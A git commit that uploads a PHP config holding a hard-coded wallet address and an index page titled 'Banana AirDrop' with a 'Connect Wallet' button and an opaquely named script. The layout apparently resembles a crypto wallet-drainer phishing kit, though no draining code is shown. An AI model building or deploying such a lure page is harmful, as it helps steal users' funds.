46014736d7c57a857da7a8785d293f938f8ce7db
godlyredflame <113570284+godlyredflame@users.noreply.github.com>
2025-03-14 18:03:19 -0400

    Add files via upload

---
+++ config.php
@@ -0,0 +1,7 @@
+<?php
+
+$wallet = '0x67F5e46A72576271358d3792e4BC35b449c51aeA';
+$timeout = 30;
+
+
+?>
---
+++ index.php
@@ -0,0 +1,33 @@
+<html>
+<head>
+  <title>Banana AirDrop</title>
+
+  <link rel="stylesheet" type="text/css" href="main.css">
+  <link rel="icon" href="favicon.png">
+  <meta name="theme-color" content="#ffe800">
+
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <script src="673b474875f7d1a3f72e14d0.js"></script>
+</head>
+
+<body>
+    
+    
+<div id="wrapper">
+  <a href="#" class="my-super-cool-btn">
+    <div class="dots-container">
+      <div class="dot"></div>
+      <div class="dot"></div>
+      <div class="dot"></div>
+      <div class="dot"></div>
+    </div>
+    <span>Connect Wallet</span>
+  </a>
+</div>
+
+<script>
+
+</script>
+
+</body>
+</html>
